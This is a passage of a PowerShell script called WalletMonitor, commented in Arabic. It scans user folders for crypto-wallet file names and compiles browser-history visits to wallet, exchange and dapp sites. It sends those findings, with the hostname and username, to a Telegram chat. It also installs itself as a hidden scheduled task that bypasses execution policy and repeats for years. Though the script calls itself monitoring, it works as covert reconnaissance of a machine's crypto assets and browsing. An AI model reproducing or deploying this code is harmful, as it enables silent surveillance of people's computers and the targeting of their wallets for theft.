    foreach ($pat in $Patterns) {
        if ([string]::IsNullOrWhiteSpace($pat)) { continue }
        if ($Name -like $pat) { return $pat }
    }
    return $null
}

function Invoke-FileSystemScan {
    Write-Log 'فحص آثار نظام الملفات...'

    $fs = Get-Prop $Script:Cfg 'filesystem' $null
    $rootsCfg     = @(Get-Prop $fs 'roots' @('%USERPROFILE%'))
    $maxDepth     = [int](Get-Prop $fs 'max_depth' 4)
    $maxItems     = [int](Get-Prop $fs 'max_items' 150000)
    $maxResults   = [int](Get-Prop $fs 'max_results' 200)
    $excludeDirs  = @(Get-Prop $fs 'exclude_dirs' @())
    $excludeFiles = @(Get-Prop $fs 'exclude_files' @())
    $excludePaths = @(Get-Prop $fs 'exclude_paths' @())

    $kwList   = @(Get-Prop $Script:Wallets 'file_keywords' @())
    $patterns = @(Get-Prop $Script:Wallets 'file_name_patterns' @())

    $selfDir = $Script:ScriptDir.TrimEnd('\')
    $excludePaths += $selfDir

    $visited = 0
    $results = 0

    foreach ($rootRaw in $rootsCfg) {
        $root = Expand-PathString $rootRaw
        if (-not $root -or -not (Test-Path -LiteralPath $root)) { continue }

        $stack = New-Object System.Collections.Stack
        $stack.Push([PSCustomObject]@{ Path = $root; Depth = 0 })

        while ($stack.Count -gt 0) {
            $cur = $stack.Pop()
            $curPath = $cur.Path
            $curDepth = $cur.Depth

            if ($visited -ge $maxItems) { Write-Log "تم الوصول للحد الأقصى لعدد العناصر ($maxItems). توقف الفحص الملفي." 'WARN'; break }
            if ($results -ge $maxResults) { break }

            $entries = $null
            try { $entries = @(Get-ChildItem -LiteralPath $curPath -Force -ErrorAction Stop) }
            catch { Write-Log "تعذّر قراءة المجلد: $curPath" 'DEBUG'; continue }

            foreach ($e in $entries) {
                $visited++
                if ($visited -ge $maxItems) { break }
                if ($results -ge $maxResults) { break }

                $isDir = $e.PSIsContainer
                $full  = $e.FullName

                $skip = $false
                foreach ($ex in $excludePaths) {
                    if ($ex -and $full.StartsWith($ex, [System.StringComparison]::OrdinalIgnoreCase)) { $skip = $true; break }
                }
                if ($skip) { continue }

                if ($isDir) {
                    if ($excludeDirs -contains $e.Name) { continue }
                    if ($curDepth -lt $maxDepth) { $stack.Push([PSCustomObject]@{ Path = $full; Depth = $curDepth + 1 }) }
                } else {
                    if ($excludeFiles -contains $e.Name) { continue }
                }

                $reason = $null
                $kw = Get-MatchedKeyword -Text $e.Name -Keywords $kwList
                if ($kw) { $reason = "كلمة مفتاحية في الاسم: $kw" }

                if (-not $reason) {
                    $pat = Test-FileNameMatch -Name $e.Name -Patterns $patterns
                    if ($pat) { $reason = "تطابق امتداد/اسم ملف: $pat" }
                }
                if (-not $reason -and $isDir) {
                    $pat = Test-FileNameMatch -Name $e.Name -Patterns $patterns
                    if ($pat) { $reason = "مجلد بتطابق: $pat" }
                }
                if (-not $reason) { continue }

                $results++
                $typeTxt = 'ملف'; if ($isDir) { $typeTxt = 'مجلد' }
                $sizeTxt = '-'
                if (-not $isDir) { try { $sizeTxt = ('{0:N0} bytes' -f $e.Length) } catch { $sizeTxt = '-' } }
                $modTxt = 'غير معروف'
                try { $modTxt = $e.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss') } catch { }

                $msg = @()
                $msg += '🔵 <b>اكتشاف جديد: أثر في نظام الملفات</b>'
                $msg += '━━━━━━━━━━━━━━━━'
                $msg += "📄 الاسم: <code>$(ConvertTo-HtmlSafe (Limit-Text $e.Name 120))</code>"
                $msg += "🧾 النوع: $typeTxt"
                $msg += "📁 المسار: <code>$(ConvertTo-HtmlSafe (Limit-Text (Split-Path -Parent $full) 220))</code>"
                $msg += "📐 الحجم: $sizeTxt"
                $msg += "🕒 تاريخ التعديل: $modTxt"
                $msg += "✅ السبب: $(ConvertTo-HtmlSafe (Limit-Text $reason 160))"
                $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
                $msg += "🕒 وقت الاكتشاف: $((Get-Date).ToString('yyyy-MM-dd HH:mm'))"

                $key = "file|$full"
                $isNew = Register-Finding -Type 'file' -Key $key -Label (Limit-Text $full 120) -Message ($msg -join "`n")
                if ($isNew) { Add-DailyCounter -Type 'file' }
                Write-Log "أثر ملفي: $full" 'INFO'
            }
        }
    }
    Write-Log "تم فحص $visited عنصر، نتائج مطابقة: $results"
}

# =====================================================================
#  14)  بناء تقرير تاريخ المتصفح (مرتب + مُصنّف + مُفلتر)
# =====================================================================

function Split-MessageChunks {
    param([string[]]$Lines, [int]$MaxChars = 3500)
    $chunks = New-Object System.Collections.ArrayList
    if ($null -eq $Lines -or @($Lines).Count -eq 0) { return @() }
    $cur = New-Object System.Text.StringBuilder
    foreach ($ln in $Lines) {
        $add = "$ln`n"
        if ($cur.Length -gt 0 -and ($cur.Length + $add.Length) -gt $MaxChars) {
            [void]$chunks.Add($cur.ToString().TrimEnd("`n"))
            $cur = New-Object System.Text.StringBuilder
        }
        [void]$cur.Append($add)
    }
    if ($cur.Length -gt 0) { [void]$chunks.Add($cur.ToString().TrimEnd("`n")) }
    return @($chunks)
}

function Build-HistoryReportLines {
    <# يبني تقرير تاريخ احترافي: مرتب + مصنّف + مُفلتر + إحصاءات. #>
    param($Hits, $ReportCfg)

    $include = @(Get-Prop $ReportCfg 'include_categories' @('wallet', 'exchange', 'dapp', 'crypto'))
    $topPer  = [int](Get-Prop $ReportCfg 'top_per_category' 15)
    $sortBy  = [string](Get-Prop $ReportCfg 'sort_by' 'visits')
    $topDom  = [int](Get-Prop $ReportCfg 'top_domains' 10)
    $recentN = [int](Get-Prop $ReportCfg 'recent_items' 8)

    $all = @($Hits)
    $sel = @($all | Where-Object { $include -contains $_.Category })

    $lookback = [int](Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'lookback_days' 30)
    $ts = (Get-Date).ToString('yyyy-MM-dd HH:mm')

    $lines = New-Object System.Collections.ArrayList
    [void]$lines.Add('🔗 <b>تقرير تاريخ المتصفحات — WalletMonitor</b>')
    [void]$lines.Add('━━━━━━━━━━━━━━━━')
    [void]$lines.Add("🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
    [void]$lines.Add("🕒 وقت التقرير: $ts")
    if ($lookback -gt 0) { [void]$lines.Add("📅 الفترة: آخر $lookback يوم") }
    else { [void]$lines.Add('📅 الفترة: كل السجل (بدون حد زمني)') }
    [void]$lines.Add("📊 روابط مفحوصة: <b>$($all.Count)</b> · مطابقة: <b>$($sel.Count)</b>")

    # توزيع التصنيفات
    $summary = @()
    foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto')) {
        if ($include -notcontains $cat) { continue }
        $c = @($sel | Where-Object { $_.Category -eq $cat }).Count
        if ($c -gt 0) { $meta = Get-CategoryMeta $cat; $summary += "$($meta.Icon) $($meta.Title): <b>$c</b>" }
    }
    if ($summary.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add('🧭 التوزيع حسب التصنيف:')
        foreach ($s in $summary) { [void]$lines.Add("   • $s") }
    }

    # توزيع حسب المتصفح (كل المتصفحات التي رأت الرابط)
    $byBrowser = @{}
    foreach ($h in $sel) {
        $names = @($h.Browsers)
        if ($names.Count -eq 0) { $names = @(([string]$h.Browser) -split '\s*,\s*') }
        foreach ($k in $names) {
            if ([string]::IsNullOrWhiteSpace($k)) { continue }
            if ($byBrowser.ContainsKey($k)) { $byBrowser[$k]++ } else { $byBrowser[$k] = 1 }
        }
    }
    if ($byBrowser.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add('🌐 حسب المتصفح:')
        foreach ($e in @($byBrowser.GetEnumerator() | Sort-Object Value -Descending)) {
            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $e.Key): <b>$($e.Value)</b>")
        }
    }

    # الأقسام (كل تصنيف مرتب)
    foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto', 'other')) {
        if ($include -notcontains $cat) { continue }
        $grouped = @($sel | Where-Object { $_.Category -eq $cat })
        if ($grouped.Count -eq 0) { continue }

        if ($sortBy -eq 'recent') {
            $sorted = @($grouped | Sort-Object @{Expression = 'Last'; Descending = $true}, @{Expression = 'Visits'; Descending = $true})
        } else {
            $sorted = @($grouped | Sort-Object @{Expression = 'Visits'; Descending = $true}, @{Expression = 'Last'; Descending = $true})
        }

        $meta = Get-CategoryMeta $cat
        [void]$lines.Add('')
        [void]$lines.Add('━━━━━━━━━━━━━━━━')
        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b> — $($grouped.Count) رابط")

        $i = 0
        foreach ($e in $sorted) {
            if ($i -ge $topPer) {
                $rest = $grouped.Count - $topPer
                if ($rest -gt 0) { [void]$lines.Add("   … و $rest رابط إضافي في هذا التصنيف.") }
                break
            }
            $i++
            $hostTxt = ConvertTo-HtmlSafe $e.Host
            $lastTxt = ConvertTo-HtmlSafe $e.Last
            $brs = @($e.Browsers)
            $brSuffix = ''
            if ($brs.Count -gt 1) { $brSuffix = " · 🌐 " + (ConvertTo-HtmlSafe ($brs -join '+')) }
            [void]$lines.Add("$i) <b>$hostTxt</b> · 👁 $($e.Visits) · 🕒 $lastTxt$brSuffix")
            [void]$lines.Add("   🔗 <code>$(ConvertTo-HtmlSafe (Limit-Text $e.Url 160))</code>")
        }
    }

    # أكثر النطاقات زيارة
    if ($sel.Count -gt 0 -and $topDom -gt 0) {
        # ملاحظة: نجمع عدد الزيارات (Visits) لكل نطاق وليس عدد الروابط المميَّزة،
        # حتى يعكس الترتيب كثافة الاستخدام الفعلية. إن غاب عدّاد الزيارات نستخدم 1 كحد أدنى.
        $counts = @{}
        foreach ($h in $sel) {
            $k = $h.Host
            $v = [int](Get-Prop $h 'Visits' 0)
            if ($v -lt 1) { $v = 1 }
            if ($counts.ContainsKey($k)) { $counts[$k] = [int]$counts[$k] + $v } else { $counts[$k] = $v }
        }
        $top = @($counts.GetEnumerator() | Sort-Object Value -Descending | Select-Object -First $topDom)
        if ($top.Count -gt 0) {
            [void]$lines.Add('')
            [void]$lines.Add('━━━━━━━━━━━━━━━━')
            [void]$lines.Add('🏆 <b>أكثر النطاقات زيارة</b> <i>(إجمالي الزيارات)</i>')
            $i = 0
            foreach ($e in $top) { $i++; [void]$lines.Add("$i) $(ConvertTo-HtmlSafe $e.Key) — <b>$($e.Value)</b>") }
        }
    }

    # آخر النشاطات
    if ($sel.Count -gt 0 -and $recentN -gt 0) {
        $recent = @($sel | Where-Object { $_.LastTs } | Sort-Object LastTs -Descending | Select-Object -First $recentN)
        if ($recent.Count -gt 0) {
            [void]$lines.Add('')
            [void]$lines.Add('━━━━━━━━━━━━━━━━')
            [void]$lines.Add('🕒 <b>آخر النشاطات</b>')
            foreach ($e in $recent) {
                [void]$lines.Add("   • $(ConvertTo-HtmlSafe $e.Host) · $(ConvertTo-HtmlSafe $e.Last) · $($e.Browser)")
            }
        }
    }

    if ($sel.Count -eq 0) {
        [void]$lines.Add('')
        [void]$lines.Add('ℹ️ لا توجد روابط داخل التصنيفات المطلوبة خلال الفترة المحددة.')
    }

    return @($lines)
}

function Send-HistoryReport {
    param([switch]$Force)

    $reportCfg = Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report' @{}
    $mode      = [string](Get-Prop $reportCfg 'mode' 'always')
    $minHours  = [int](Get-Prop $reportCfg 'min_hours_between_reports' 6)
    $maxChars  = [int](Get-Prop $reportCfg 'max_message_chars' 3500)

    if (-not $Force) {
        if (@($Script:HistoryHits).Count -eq 0) { Write-Log 'لا توجد روابط تاريخ لإرسال تقرير.' 'DEBUG'; return }

        $last = [string]$Script:State.last_report_ts
        if ($last) {
            $dt = $null
            try { $dt = [datetime]::Parse($last) } catch { $dt = $null }
            if ($dt) {
                $hours = ((Get-Date) - $dt).TotalHours
                if ($hours -lt $minHours) {
                    Write-Log ("تخطّي تقرير التاريخ (آخر تقرير قبل {0:N1} ساعة، الحد الأدنى $minHours)." -f $hours) 'DEBUG'
                    return
                }
            }
        }

        if ($mode -eq 'new_only' -and $Script:NewHistoryCount -le 0) {
            Write-Log 'تخطّي تقرير التاريخ (الوضع new_only ولا يوجد جديد).' 'DEBUG'
            return
        }
    }

    $lines = Build-HistoryReportLines -Hits $Script:HistoryHits -ReportCfg $reportCfg
    if (@($lines).Count -eq 0) { return }

    $chunks = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
    $total = $chunks.Count
    $sentAll = $true
    for ($i = 0; $i -lt $total; $i++) {
        $prefix = ''
        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
        $ok = Send-TelegramMessage -Text ($prefix + $chunks[$i])
        if (-not $ok) { $sentAll = $false }
    }
    if ($sentAll) {
        $Script:State.last_report_ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        Write-Log "تم إرسال تقرير التاريخ ($total رسالة)."
    } else {
        Write-Log 'فشل إرسال جزء من تقرير التاريخ.' 'ERROR'
    }
}

# =====================================================================
#  15)  إشعارات الاكتشافات الجديدة (مرتبة حسب النوع)
# =====================================================================

function Send-NewFindings {
    $items = @($Script:NewItems)
    if ($items.Count -eq 0) {
        Write-Log 'لا توجد اكتشافات جديدة (غير التاريخ) في هذه الدورة.'
        return
    }

    Write-Log "عدد الاكتشافات الجديدة: $($items.Count)"

    $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4 }
    $items = @($items | Sort-Object @{ Expression = { [int]$order[$_.Type] } }, @{ Expression = { $_.Label } })

    $d = @($items | Where-Object { $_.Type -eq 'desktop' }).Count
    $x = @($items | Where-Object { $_.Type -eq 'extension' }).Count
    $f = @($items | Where-Object { $_.Type -eq 'file' }).Count

    # رسالة تجميعية أولاً (فرز سريع للنظرة العامة)
    $head = @()
    $head += '📥 <b>اكتشافات جديدة — WalletMonitor</b>'
    $head += '━━━━━━━━━━━━━━━━'
    $head += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $head += "🕒 الوقت: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $head += "📊 الإجمالي: <b>$($items.Count)</b>"
    $head += "🔴 محافظ سطح مكتب: $d"
    $head += "🟠 إضافات متصفح: $x"
    $head += "🔵 آثار ملفات: $f"
    if ($Script:NewHistoryCount -gt 0) { $head += "🟡 زيارات مواقع جديدة: $($Script:NewHistoryCount) (تظهر في تقرير التاريخ)" }
    [void](Send-TelegramMessage -Text ($head -join "`n"))
    $Script:SentCount++

    # التفاصيل
    $limit = if ($Script:MaxPerRun -gt 0) { $Script:MaxPerRun } else { $items.Count }
    $i = 0
    foreach ($it in $items) {
        if ($i -ge $limit) {
            $rest = $items.Count - $limit
            [void](Send-TelegramMessage -Text "📎 يوجد $rest اكتشاف إضافي لم يتم إرسال تفاصيله (تم بلوغ حد max_notifications_per_run). راجع اللوج.")
            break
        }
        if (Send-TelegramMessage -Text $it.Message) { $Script:SentCount++ }
        $i++
    }
    Write-Log "تم إرسال إشعارات الاكتشافات الجديدة."
}

# =====================================================================
#  16)  الملخص اليومي
# =====================================================================

function Invoke-DailySummaryIfDue {
    $sched = Get-Prop $Script:Cfg 'schedule' $null
    $ds = Get-Prop $sched 'daily_summary' $null
    if (-not $ds -or -not [bool](Get-Prop $ds 'enabled' $true)) { return }

    $hour = [int](Get-Prop $ds 'hour' 21)
    $now = Get-Date
    $today = $now.ToString('yyyy-MM-dd')

    if ($now.Hour -lt $hour) { return }
    if ([string]$Script:State.last_summary_date -eq $today) { return }

    $entry = $null
    foreach ($dd in $Script:State.daily) { if ($dd.date -eq $today) { $entry = $dd; break } }
    $d = 0; $x = 0; $h = 0; $f = 0
    if ($entry) {
        $d = [int](Get-Prop $entry 'desktop' 0)
        $x = [int](Get-Prop $entry 'extension' 0)
        $h = [int](Get-Prop $entry 'history' 0)
        $f = [int](Get-Prop $entry 'file' 0)
    }
    $total = $d + $x + $h + $f

    $msg = @()
    $msg += '📊 <b>الملخص اليومي — WalletMonitor</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "📅 التاريخ: $today"
    $msg += "🔴 محافظ سطح مكتب: $d"
    $msg += "🟠 إضافات متصفح: $x"
    $msg += "🟡 زيارات مواقع: $h"
    $msg += "🔵 ملفات/مجلدات مشبوهة: $f"
    $msg += "∑ الإجمالي: <b>$total</b>"
    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    if ($total -eq 0) { $msg += '✅ لا اكتشافات جديدة خلال آخر 24 ساعة.' }

    if (Send-TelegramMessage -Text ($msg -join "`n")) {
        $Script:State.last_summary_date = $today
        Write-Log 'تم إرسال الملخص اليومي.'
    }
}

# =====================================================================
#  17)  إشعارات الأخطاء
# =====================================================================

function Send-ErrorNotification {
    if (-not $Script:NotifyOnError) { return }
    $errs = @($Script:RunErrors | Select-Object -Unique)
    if ($errs.Count -eq 0) { return }

    $msg = @()
    $msg += '⚠️ <b>تنبيه: مشاكل في أداة المراقبة</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $msg += "🕒 الوقت: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $msg += '❗️ التفاصيل:'
    foreach ($e in ($errs | Select-Object -First 15)) { $msg += "• $(ConvertTo-HtmlSafe (Limit-Text $e 220))" }
    if ($errs.Count -gt 15) { $msg += "• ... و $($errs.Count - 15) خطأ آخر (راجع اللوج)." }
    $msg += '📄 راجع ملف اللوج: <code>wallet-monitor.log</code>'

    [void](Send-TelegramMessage -Text ($msg -join "`n"))
}

# =====================================================================
#  18)  تسجيل المهمة المجدولة (Task Scheduler) - من نفس الملف
# =====================================================================

function Test-Admin {
    try {
        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $p = New-Object System.Security.Principal.WindowsPrincipal($id)
        return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

function Show-TaskStatus {
    $taskName = 'WalletMonitor'
    $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $t) { Write-Console "المهمة '$taskName' غير مسجّلة." -ForegroundColor Yellow; return }
    $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
    Write-Console "المهمة: $taskName"
    Write-Console "الحالة: $($t.State)"
    if ($info) {
        Write-Console "آخر تشغيل: $($info.LastRunTime)"
        Write-Console "نتيجة آخر تشغيل: $($info.LastTaskResult)"
        Write-Console "التشغيل القادم: $($info.NextRunTime)"
    }
}

function Install-Task {
    param([int]$Minutes)
    $taskName = 'WalletMonitor'
    if (-not $Minutes -or $Minutes -lt 1) { $Minutes = 30 }

    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $Script:SelfPath }
    if (-not $scriptPath -or -not (Test-Path -LiteralPath $scriptPath)) {
        Write-Console 'تعذّر تحديد مسار الملف الحالي لتسجيل المهمة.' -ForegroundColor Red; return
    }

    if (-not (Test-Admin)) {
        Write-Console 'يجب تشغيل هذا الأمر من PowerShell مرفوع الصلاحيات (Run as Administrator).' -ForegroundColor Red
        return
    }

    try {
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
            -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""

        $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(2)) `
            -RepetitionInterval (New-TimeSpan -Minutes $Minutes) `
            -RepetitionDuration (New-TimeSpan -Days 3650)

        $settings = New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -MultipleInstances IgnoreNew `
            -ExecutionTimeLimit (New-TimeSpan -Hours 1)

        $principal = New-ScheduledTaskPrincipal `
            -UserId "$env:USERDOMAIN\$env:USERNAME" `
            -LogonType Interactive `
            -RunLevel Limited

        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -Force `
            -Description 'WalletMonitor - مراقبة آثار محافظ الكريبتو وإرسال إشعارات Telegram' | Out-Null

        Write-Console "تم تسجيل المهمة '$taskName' بنجاح." -ForegroundColor Green
        Write-Console "أول تشغيل: $((Get-Date).AddMinutes(2).ToString('yyyy-MM-dd HH:mm'))"
        Write-Console "التكرار: كل $Minutes دقيقة"
        Write-Console 'ملاحظة: المهمة تعمل فقط عندما يكون المستخدم مسجّل الدخول (LogonType Interactive).'
    } catch {
        Write-Console "فشل تسجيل المهمة: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Uninstall-Task {
    $taskName = 'WalletMonitor'
    if (-not (Test-Admin)) {
        Write-Console 'يجب تشغيل هذا الأمر من PowerShell مرفوع الصلاحيات (Run as Administrator).' -ForegroundColor Red
        return
    }
    $t = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($t) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        Write-Console "تم إزالة المهمة '$taskName'." -ForegroundColor Green
    } else {
        Write-Console "المهمة '$taskName' غير موجودة أصلاً." -ForegroundColor Yellow
    }
}

# =====================================================================
#  19)  دورة الفحص الكاملة
# =====================================================================

function Send-StartupNotification {
    $tg = Get-Prop $Script:Cfg 'telegram' $null
    if (-not [bool](Get-Prop $tg 'notify_on_start' $true)) { return }

    $msg = @()
    $msg += '✅ <b>WalletMonitor شغّال</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>"
    $msg += "👤 المستخدم: <code>$(ConvertTo-HtmlSafe $env:USERNAME)</code>"
    $msg += "🕒 وقت البدء: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $msg += "⏱ الفحص كل $($Script:IntervalMinutes) دقيقة"
    [void](Send-TelegramMessage -Text ($msg -join "`n"))
}

function Invoke-FullScan {
    $cycleStart = Get-Date
    Write-Log '=========== بدء دورة فحص جديدة ==========='
    $Script:RunErrors = New-Object System.Collections.ArrayList
    $Script:FoundItems = New-Object System.Collections.ArrayList
    $Script:NewItems = New-Object System.Collections.ArrayList
    $Script:SentCount = 0

    $scanCfg = Get-Prop $Script:Cfg 'scan' $null

    if ([bool](Get-Prop $scanCfg 'installed_programs' $true)) {
        try { Invoke-InstalledProgramScan }
        catch { Add-Error "فشل فحص البرامج المثبتة: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
    }

    if ([bool](Get-Prop $scanCfg 'browser_extensions' $true)) {
        try { Invoke-BrowserExtensionScan }
        catch { Add-Error "فشل فحص إضافات المتصفح: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
    }

    if ([bool](Get-Prop $scanCfg 'browser_history' $true)) {
        try { Invoke-BrowserHistoryScan }
        catch { Add-Error "فشل فحص تاريخ المتصفح: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
    }

    if ([bool](Get-Prop $scanCfg 'filesystem' $true)) {
        try { Invoke-FileSystemScan }
        catch { Add-Error "فشل فحص نظام الملفات: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
    }

    Send-NewFindings
    Send-HistoryReport
    Send-ErrorNotification
    Invoke-DailySummaryIfDue

    Save-State

    $dur = [int]((Get-Date) - $cycleStart).TotalSeconds
    Write-Log "=========== انتهت الدورة (إجمالي النتائج: $($Script:FoundItems.Count) | جديدة: $($Script:NewItems.Count) | مدة: ${dur}s) ==========="
}

# =====================================================================
#  20)  نقطة البداية (Main)
# =====================================================================

$Script:SelfPath = $PSCommandPath
if (-not $Script:SelfPath) { $Script:SelfPath = $MyInvocation.MyCommand.Path }

# دمج ملف إعدادات خارجي (اختياري) فوق البطاقة المدمجة
if ($Script:ConfigFile) {
    try {
        $ext = Read-JsonFile $Script:ConfigFile
        Merge-Config $CONFIG $ext
        Write-Console "تم تحميل إعدادات إضافية من: $($Script:ConfigFile)"
    } catch {
        Write-Console "تحذير: تعذّر قراءة ملف الإعدادات '$($Script:ConfigFile)' — $($_.Exception.Message)" -ForegroundColor Yellow
    }
}
$Script:Cfg = $CONFIG
$Script:Wallets = $WALLETS

$hostLabelCfg = [string](Get-Prop $Script:Cfg 'host_label' '')
if ($hostLabelCfg) { $Script:HostLabel = $hostLabelCfg }

if ($Help) {
    Write-Console 'WalletMonitor v3.0 — مراقبة آثار محافظ الكريبتو (ملف واحد، بدون Python)' 'Cyan'
    Write-Console ''
    Write-Console '  (بدون مفاتيح)   فحص واحد صامت + إشعارات Telegram'
    Write-Console '  -Console         إظهار المخرجات على الشاشة'
    Write-Console '  -ScanNow         فحص فوري'
    Write-Console '  -TestNotify      إرسال رسالة اختبار إلى Telegram'
    Write-Console '  -HistoryReport   إرسال تقرير تاريخ المتصفح الآن'
    Write-Console '  -Loop            حلقة مراقبة مستمرة (حسب schedule.interval_minutes)'
    Write-Console '  -Install         تسجيل مهمة مجدولة (يحتاج Administrator)'
    Write-Console '  -Uninstall       إزالة المهمة المجدولة'
    Write-Console '  -TaskStatus      عرض حالة المهمة'
    Write-Console '  -ResetState      تصفير ملف الحالة (state.json)'
    Write-Console '  -NoNotify        تعطيل إرسال Telegram'
    Write-Console '  -ConfigPath <f>  تحميل ملف إعدادات خارجي فوق المدمج'
    Write-Console ''
    exit 0
}

# ---- إدارة المهمة المجدولة (لا تحتاج تشغيل الفحص) ----
if ($TaskStatus) { Show-TaskStatus; exit 0 }
if ($Uninstall)  { Uninstall-Task; exit 0 }
if ($Install) {
    $m = $IntervalMinutes
    if (-not $m -or $m -lt 1) { $m = [int](Get-Prop (Get-Prop $Script:Cfg 'schedule') 'interval_minutes' 30) }
    Install-Task -Minutes $m
    exit 0
}

Initialize-Log
Rotate-LogIfNeeded
Write-Log '################ WalletMonitor v3.0 (ملف واحد، بدون Python) ################'

Initialize-Telegram
Initialize-State

$Script:IntervalMinutes = [int](Get-Prop (Get-Prop $Script:Cfg 'schedule') 'interval_minutes' 30)
if ($IntervalMinutes -gt 0) { $Script:IntervalMinutes = $IntervalMinutes }
if ($Script:IntervalMinutes -lt 1) { $Script:IntervalMinutes = 30 }

if ($TestNotify) {
    Write-Console 'إرسال رسالة اختبار إلى Telegram...'
    $txt = "🔔 <b>رسالة اختبار — WalletMonitor</b>`n━━━━━━━━━━━━━━━━`n✅ الربط بـ Telegram يعمل بشكل صحيح.`n🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code>`n🕒 $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
    $ok = Send-TelegramMessage -Force -Text $txt
    if ($ok) { Write-Console 'تم الإرسال بنجاح.' -ForegroundColor Green; exit 0 }
    else { Write-Console 'فشل الإرسال. تحقق من التوكن و chat_id.' -ForegroundColor Red; exit 2 }
}

if ($HistoryReport) {
    Write-Console 'تشغيل تقرير تاريخ المتصفح...'
    try { Invoke-BrowserHistoryScan } catch { Add-Error "فشل فحص التاريخ: $($_.Exception.Message)" }
    Send-HistoryReport -Force
    Save-State
    exit 0
}

if ($Loop) {
    Send-StartupNotification
    Write-Console "وضع المراقبة المستمرة — فحص كل $Script:IntervalMinutes دقيقة. (Ctrl+C للإيقاف)" -ForegroundColor Cyan
    while ($true) {
        $cycleStart = Get-Date
        try { Invoke-FullScan } catch { Write-Log "خطأ غير متوقع في الدورة: $($_.Exception.Message)" 'ERROR' }
        $elapsed = (Get-Date) - $cycleStart
        $sleep = ($Script:IntervalMinutes * 60) - [int]$elapsed.TotalSeconds
        if ($sleep -lt 10) { $sleep = 10 }
        Write-Log "النوم $sleep ثانية حتى الدورة القادمة..."
        Start-Sleep -Seconds $sleep
    }
}
else {
    Invoke-FullScan
    exit 0
}
